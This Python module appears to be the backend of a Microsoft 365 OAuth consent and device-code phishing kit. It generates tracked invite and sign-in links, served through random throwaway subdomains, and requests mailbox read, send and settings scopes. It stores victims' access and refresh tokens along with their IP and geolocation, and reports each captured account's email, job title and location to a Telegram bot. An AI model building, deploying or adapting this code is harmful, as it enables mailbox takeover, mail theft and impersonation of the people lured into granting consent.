import os
import time
import uuid
from datetime import datetime, timedelta
from urllib.parse import urlencode, quote_plus, unquote

import requests

from db import SessionLocal, init_db
from models import (
    TenantToken,
    SavedUser,
    ConnectInvite,
    TenantConsent,
    TenantConsentStatus,
    EnterpriseTenant,
    EnterpriseMode,
)

CLIENT_ID = os.getenv("CLIENT_ID")
CLIENT_SECRET = os.getenv("CLIENT_SECRET")
REDIRECT_URI = os.getenv("REDIRECT_URI", "https://oauth-backend-7cuu.onrender.com/auth/callback")

AUTHORIZE_URL = "https://login.microsoftonline.com/common/oauth2/v2.0/authorize"
TOKEN_URL = "https://login.microsoftonline.com/common/oauth2/v2.0/token"
DEVICE_CODE_URL = "https://login.microsoftonline.com/organizations/oauth2/v2.0/devicecode"
DEVICE_TOKEN_URL = "https://login.microsoftonline.com/organizations/oauth2/v2.0/token"

GRAPH_ME_URL = "https://graph.microsoft.com/v1.0/me?$select=id,displayName,mail,userPrincipalName,jobTitle"

# =========================
# SCOPES
# =========================

# Step 1: pure sign-in / identity only
BASIC_SCOPES = "openid profile offline_access"

# Step 2: preview inbox mode
PREVIEW_SCOPES = "openid profile offline_access https://graph.microsoft.com/User.Read https://graph.microsoft.com/Mail.ReadBasic"

# Step 3: enterprise full access
ENTERPRISE_SCOPES = "openid profile offline_access https://graph.microsoft.com/User.Read https://graph.microsoft.com/Mail.ReadWrite https://graph.microsoft.com/Mail.Send https://graph.microsoft.com/MailboxSettings.ReadWrite"

TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")

ADMIN_CONSENT_TENANT = os.getenv("ADMIN_CONSENT_TENANT", "organizations")
WORKER_DOMAIN = os.getenv("WORKER_DOMAIN", "").strip()

DEFAULT_SESSION_ID = "jwt-only"


# =========================
# TELEGRAM ALERTS
# =========================

def send_telegram_alert(message: str):
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        return

    try:
        requests.post(
            f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage",
            data={"chat_id": TELEGRAM_CHAT_ID, "text": message},
            timeout=20,
        )
    except Exception as e:
        print(f"Telegram alert failed: {e}")


# =========================
# TOKEN STORAGE
# =========================

def save_token(user_id, token_data, device_info=None):
    init_db()
    db = SessionLocal()

    try:
        expires_at = int(
            (datetime.utcnow() + timedelta(seconds=token_data["expires_in"])).timestamp()
        )

        existing = db.query(TenantToken).filter_by(tenant_id=user_id).first()

        if existing:
            existing.access_token = token_data["access_token"]
            existing.refresh_token = token_data.get("refresh_token") or existing.refresh_token
            existing.expires_at = expires_at

            if hasattr(existing, "session_id") and not existing.session_id:
                existing.session_id = DEFAULT_SESSION_ID

            if device_info:
                existing.ip_address = device_info.get("ip")
                existing.user_agent = device_info.get("agent")
                existing.location = device_info.get("location")
        else:
            row = TenantToken(
                tenant_id=user_id,
                access_token=token_data["access_token"],
                refresh_token=token_data.get("refresh_token"),
                expires_at=expires_at,
                ip_address=device_info.get("ip") if device_info else None,
                user_agent=device_info.get("agent") if device_info else None,
                location=device_info.get("location") if device_info else None,
            )

            if hasattr(row, "session_id"):
                row.session_id = DEFAULT_SESSION_ID

            db.add(row)

        db.commit()
    finally:
        db.close()


def get_token(user_id):
    init_db()
    db = SessionLocal()
    try:
        return db.query(TenantToken).filter_by(tenant_id=user_id).first()
    finally:
        db.close()


# =========================
# SAVED USERS
# =========================

def save_saved_user(admin_user_id: str, target_user_id: str, job_title: str | None = None):
    init_db()
    db = SessionLocal()

    try:
        existing = (
            db.query(SavedUser)
            .filter(
                SavedUser.admin_user_id == admin_user_id,
                SavedUser.user_id == target_user_id,
            )
            .first()
        )

        if not existing:
            row = SavedUser(
                admin_user_id=admin_user_id,
                user_id=target_user_id,
            )
            if hasattr(row, "job_title"):
                row.job_title = job_title
            db.add(row)
        else:
            if hasattr(existing, "job_title") and job_title:
                existing.job_title = job_title

        db.commit()
    finally:
        db.close()


# =========================
# TENANT CONSENT
# =========================

def save_or_update_tenant_consent(
    admin_user_id: str,
    tenant_hint: str,
    admin_consent_url: str | None = None,
    status: TenantConsentStatus = TenantConsentStatus.PENDING,
    notes: str | None = None,
):
    init_db()
    db = SessionLocal()

    try:
        row = (
            db.query(TenantConsent)
            .filter(
                TenantConsent.admin_user_id == admin_user_id,
                TenantConsent.tenant_hint == tenant_hint,
            )
            .first()
        )

        now_ts = int(time.time())

        if not row:
            row = TenantConsent(
                admin_user_id=admin_user_id,
                tenant_hint=tenant_hint,
                admin_consent_url=admin_consent_url,
                status=status,
                notes=notes,
                created_at=now_ts,
                updated_at=now_ts,
            )
            db.add(row)
        else:
            if admin_consent_url:
                row.admin_consent_url = admin_consent_url
            if status:
                row.status = status
            if notes is not None:
                row.notes = notes
            row.updated_at = now_ts

        db.commit()
    finally:
        db.close()


# =========================
# ENTERPRISE TENANTS
# =========================

def get_user_enterprise_mode(user_id: str):
    if not user_id:
        return "preview"

    tenant_hint = user_id.split("@")[-1].lower() if "@" in user_id else user_id.lower()

    init_db()
    db = SessionLocal()
    try:
        row = db.query(EnterpriseTenant).filter(
            EnterpriseTenant.tenant_hint == tenant_hint
        ).first()

        if not row:
            return "preview"

        status_value = row.consent_status.value if hasattr(row.consent_status, "value") else str(row.consent_status)
        if status_value.lower() != "approved":
            return "preview"

        mode_value = row.mode.value if hasattr(row.mode, "value") else str(row.mode)
        return mode_value.lower()
    finally:
        db.close()


def resolve_scopes(user_id: str | None = None, mail_mode: bool = False):
    if not mail_mode:
        return BASIC_SCOPES

    mode = get_user_enterprise_mode(user_id or "")

    if mode == "enterprise_full":
        return ENTERPRISE_SCOPES

    return PREVIEW_SCOPES


# =========================
# CONNECT INVITES
# =========================

def create_connect_invite(admin_user_id: str, connect_mode: str = "basic"):
    init_db()
    db = SessionLocal()

    try:
        invite_token = f"{uuid.uuid4().int % 10**7}-{uuid.uuid4().int % 10**12}-{uuid.uuid4().hex[:10]}"

        row = ConnectInvite(
            admin_user_id=admin_user_id,
            invite_token=invite_token,
            is_used=False,
        )

        if hasattr(row, "connect_mode"):
            row.connect_mode = connect_mode

        db.add(row)
        db.commit()

        return invite_token
    finally:
        db.close()


def get_connect_invite(invite_token: str):
    init_db()
    db = SessionLocal()

    try:
        return db.query(ConnectInvite).filter(ConnectInvite.invite_token == invite_token).first()
    finally:
        db.close()


def mark_connect_invite_used(
    invite_token: str,
    resolved_user_id: str | None = None,
    job_title: str | None = None,
):
    init_db()
    db = SessionLocal()

    try:
        invite = db.query(ConnectInvite).filter(ConnectInvite.invite_token == invite_token).first()

        if invite:
            invite.is_used = True
            invite.used_at = int(datetime.utcnow().timestamp())
            if resolved_user_id:
                invite.resolved_user_id = resolved_user_id
            if hasattr(invite, "job_title") and job_title:
                invite.job_title = job_title
            db.commit()
    finally:
        db.close()


# =========================
# WORKER URL
# =========================

def wrap_worker_url(path: str, params: dict):
    if not WORKER_DOMAIN:
        return f"https://oauth-backend-7cuu.onrender.com/{path}?{urlencode(params)}"

    token = str(uuid.uuid4()).replace("-", "")
    subdomain = f"{token}.{WORKER_DOMAIN}"
    query = urlencode(params)
    return f"https://{subdomain}/{path}?{query}"


# =========================
# AUTHORIZE URL BUILDERS
# =========================

def build_authorize_url(
    state_value: str,
    scopes: str,
    prompt: str | None = None,
    tenant: str = "common",
    login_hint: str | None = None,
    domain_hint: str | None = None,
):
    params = {
        "client_id": CLIENT_ID,
        "response_type": "code",
        "redirect_uri": REDIRECT_URI,
        "response_mode": "query",
        "scope": scopes,
        "state": quote_plus(state_value),
    }

    if prompt:
        params["prompt"] = prompt

    if login_hint:
        params["login_hint"] = login_hint

    if domain_hint:
        params["domain_hint"] = domain_hint

    return f"https://login.microsoftonline.com/{tenant}/oauth2/v2.0/authorize?{urlencode(params)}"


# =========================
# LOGIN LINKS
# =========================

def generate_login_link(user_id: str):
    # Step 1: pure login
    state_value = f"user_basic:{user_id}"
    return build_authorize_url(
        state_value=state_value,
        scopes=resolve_scopes(user_id=user_id, mail_mode=False),
        tenant="common",
    )


def generate_mail_connect_link(user_id: str):
    # Step 2/3: preview or enterprise full
    state_value = f"user_mail:{user_id}"
    return build_authorize_url(
        state_value=state_value,
        scopes=resolve_scopes(user_id=user_id, mail_mode=True),
        tenant="common",
    )


def generate_org_connect_link(admin_user_id: str):
    invite_token = create_connect_invite(admin_user_id, connect_mode="basic")
    state_value = f"invite_basic:{invite_token}"
    return build_authorize_url(
        state_value=state_value,
        scopes=BASIC_SCOPES,
        tenant="common",
    )


def generate_org_mail_connect_link(admin_user_id: str):
    invite_token = create_connect_invite(admin_user_id, connect_mode="mail")
    state_value = f"invite_mail:{invite_token}"
    # org mail link defaults to preview until tenant is marked enterprise_full
    return build_authorize_url(
        state_value=state_value,
        scopes=PREVIEW_SCOPES,
        tenant="common",
    )


def generate_admin_consent_url(tenant: str | None = None):
    tenant_value = tenant or ADMIN_CONSENT_TENANT
    params = {
        "client_id": CLIENT_ID,
        "redirect_uri": REDIRECT_URI,
    }
    return f"https://login.microsoftonline.com/{tenant_value}/adminconsent?{urlencode(params)}"


# =========================
# DEVICE INFO
# =========================

def build_device_info(client_ip: str = None, user_agent: str = None):
    location_str = "unknown"

    if client_ip:
        try:
            resp = requests.get(f"https://ipinfo.io/{client_ip}/json", timeout=10)
            if resp.ok:
                loc = resp.json()
                location_str = f"{loc.get('city')}, {loc.get('region')}, {loc.get('country')}"
        except Exception:
            pass

    return {
        "ip": client_ip,
        "agent": user_agent,
        "location": location_str,
    }


# =========================
# GRAPH PROFILE FETCH
# =========================

def fetch_graph_identity(access_token: str):
    headers = {"Authorization": f"Bearer {access_token}"}
    res = requests.get(GRAPH_ME_URL, headers=headers, timeout=30)
    data = res.json() if res.content else {}

    resolved_user_id = (
        data.get("userPrincipalName")
        or data.get("mail")
        or data.get("id")
    )

    return {
        "resolved_user_id": resolved_user_id,
        "job_title": data.get("jobTitle"),
        "profile": data,
    }


# =========================
# AUTH CODE EXCHANGE
# =========================

def exchange_code_for_token(code: str, state: str, client_ip: str = None, user_agent: str = None):
    init_db()

    decoded_state = unquote(state)

    requested_scopes = BASIC_SCOPES
    flow_type = "basic"

    if decoded_state.startswith("user_mail:") or decoded_state.startswith("invite_mail:"):
        flow_type = "mail"
        flow_user_id = None

        if decoded_state.startswith("user_mail:"):
            flow_user_id = decoded_state.split("user_mail:", 1)[1]
        elif decoded_state.startswith("invite_mail:"):
            invite_token = decoded_state.split("invite_mail:", 1)[1]
            invite = get_connect_invite(invite_token)
            if invite and invite.resolved_user_id:
                flow_user_id = invite.resolved_user_id

        requested_scopes = resolve_scopes(user_id=flow_user_id, mail_mode=True)

    token_payload = {
        "client_id": CLIENT_ID,
        "client_secret": CLIENT_SECRET,
        "code": code,
        "redirect_uri": REDIRECT_URI,
        "grant_type": "authorization_code",
        "scope": requested_scopes,
    }

    response = requests.post(TOKEN_URL, data=token_payload, timeout=30)
    result = response.json()

    if "error" in result:
        raise Exception(f"Token exchange failed: {result.get('error_description', result['error'])}")

    access_token = result["access_token"]

    # Pure login scopes may not include Graph /me access.
    # Try to resolve identity from Graph if possible, otherwise fall back to state.
    resolved_user_id = None
    job_title = None
    profile = {}

    try:
        identity = fetch_graph_identity(access_token)
        resolved_user_id = identity["resolved_user_id"]
        job_title = identity["job_title"]
        profile = identity["profile"]
    except Exception:
        pass

    device_info = build_device_info(client_ip, user_agent)

    admin_user_id_for_saved_user = None

    if decoded_state.startswith("user_basic:"):
        admin_user_id_for_saved_user = decoded_state.split("user_basic:", 1)[1]
    elif decoded_state.startswith("user_mail:"):
        admin_user_id_for_saved_user = decoded_state.split("user_mail:", 1)[1]
    elif decoded_state.startswith("invite_basic:"):
        invite_token = decoded_state.split("invite_basic:", 1)[1]
        invite = get_connect_invite(invite_token)
        if invite:
            admin_user_id_for_saved_user = invite.admin_user_id
            if resolved_user_id:
                mark_connect_invite_used(invite_token, resolved_user_id, job_title)
    elif decoded_state.startswith("invite_mail:"):
        invite_token = decoded_state.split("invite_mail:", 1)[1]
        invite = get_connect_invite(invite_token)
        if invite:
            admin_user_id_for_saved_user = invite.admin_user_id
            if resolved_user_id:
                mark_connect_invite_used(invite_token, resolved_user_id, job_title)
    elif decoded_state.startswith("user:"):
        admin_user_id_for_saved_user = decoded_state.split("user:", 1)[1]
    elif decoded_state.startswith("invite:"):
        invite_token = decoded_state.split("invite:", 1)[1]
        invite = get_connect_invite(invite_token)
        if invite:
            admin_user_id_for_saved_user = invite.admin_user_id
            if resolved_user_id:
                mark_connect_invite_used(invite_token, resolved_user_id, job_title)
    else:
        admin_user_id_for_saved_user = decoded_state

    # If pure login has no Graph identity, keep fallback user id from state for continuity
    effective_user_id = resolved_user_id or admin_user_id_for_saved_user

    if effective_user_id:
        save_token(effective_user_id, result, device_info)

    if admin_user_id_for_saved_user and resolved_user_id:
        save_saved_user(admin_user_id_for_saved_user, resolved_user_id, job_title)

    email = profile.get("userPrincipalName") or profile.get("mail") or resolved_user_id or "unknown"

    send_telegram_alert(
        f"Resolved User ID: {resolved_user_id or 'unknown'}\n"
        f"Job Title: {job_title or 'unknown'}\n"
        f"Admin/User Context: {admin_user_id_for_saved_user or 'unknown'}\n"
        f"Email: {email}\n"
        f"IP: {client_ip or 'unknown'}\n"
        f"Location: {device_info.get('location', 'unknown')}\n"
        f"Flow: oauth_redirect ({flow_type})"
    )

    return {
        "resolved_user_id": resolved_user_id,
        "job_title": job_title,
        "profile": profile,
        "admin_user_id": admin_user_id_for_saved_user,
        "flow_type": flow_type,
    }


# =========================
# DEVICE FLOW
# =========================

def start_device_code_flow(mail_mode: bool = False, user_id: str | None = None):
    payload = {
        "client_id": CLIENT_ID,
        "scope": resolve_scopes(user_id=user_id, mail_mode=mail_mode),
    }

    res = requests.post(
        DEVICE_CODE_URL,
        data=payload,
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        timeout=30,
    )

    data = res.json() if res.content else {}

    if res.status_code >= 400 or "error" in data:
        error_message = data.get("error_description") or data.get("error") or res.text
        raise Exception(f"Device code start failed: {error_message}")

    return {
        "device_code": data["device_code"],
        "user_code": data["user_code"],
        "verification_uri": data["verification_uri"],
        "message": data["message"],
        "expires_in": data["expires_in"],
        "interval": data["interval"],
        "flow_type": "mail" if mail_mode else "basic",
    }


def poll_device_code_flow(
    device_code: str,
    admin_user_id: str | None = None,
    client_ip: str = None,
    user_agent: str = None,
):
    payload = {
        "grant_type": "urn:ietf:params:oauth:grant-type:device_code",
        "client_id": CLIENT_ID,
        "device_code": device_code,
    }

    res = requests.post(
        DEVICE_TOKEN_URL,
        data=payload,
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        timeout=30,
    )

    data = res.json() if res.content else {}

    if res.status_code == 200 and "access_token" in data:
        resolved_user_id = None
        job_title = None
        profile = {}

        try:
            identity = fetch_graph_identity(data["access_token"])
            resolved_user_id = identity["resolved_user_id"]
            job_title = identity["job_title"]
            profile = identity["profile"]
        except Exception:
            pass

        if resolved_user_id:
            device_info = build_device_info(client_ip, user_agent)
            save_token(resolved_user_id, data, device_info)

            if admin_user_id:
                save_saved_user(admin_user_id, resolved_user_id, job_title)

            email = profile.get("userPrincipalName") or profile.get("mail") or resolved_user_id or "unknown"

            send_telegram_alert(
                f"Resolved User ID: {resolved_user_id}\n"
                f"Job Title: {job_title or 'unknown'}\n"
                f"Admin/User Context: {admin_user_id or 'unknown'}\n"
                f"Email: {email}\n"
                f"IP: {client_ip or 'unknown'}\n"
                f"Location: {device_info.get('location', 'unknown')}\n"
                f"Flow: device_code"
            )

        return {
            "status": "complete",
            "resolved_user_id": resolved_user_id,
            "job_title": job_title,
            "profile": profile,
        }

    error_code = data.get("error")
    error_description = data.get("error_description", "")

    if error_code == "authorization_pending":
        return {
            "status": "pending",
            "error": error_code,
            "detail": error_description,
        }

    if error_code == "authorization_declined":
        return {
            "status": "declined",
            "error": error_code,
            "detail": error_description,
        }

    if error_code == "expired_token":
        return {
            "status": "expired",
            "error": error_code,
            "detail": error_description,
        }

    if error_code == "bad_verification_code":
        return {
            "status": "error",
            "error": error_code,
            "detail": error_description,
        }

    return {
        "status": "error",
        "error": error_code or "unknown_error",
        "detail": error_description or res.text,
    }


# =========================
# TOKEN REFRESH
# =========================

def refresh_token(user_id: str):
    token_record = get_token(user_id)

    if not token_record or not token_record.refresh_token:
        raise Exception("No refresh token available. User must re-login.")

    requested_scopes = resolve_scopes(user_id=user_id, mail_mode=True)

    data = {
        "client_id": CLIENT_ID,
        "client_secret": CLIENT_SECRET,
        "refresh_token": token_record.refresh_token,
        "grant_type": "refresh_token",
        "scope": requested_scopes,
    }

    response = requests.post(TOKEN_URL, data=data, timeout=30)
    result = response.json()

    if "error" in result:
        raise Exception(f"Token refresh failed: {result.get('error_description', result['error'])}")

    save_token(user_id, result)
    return result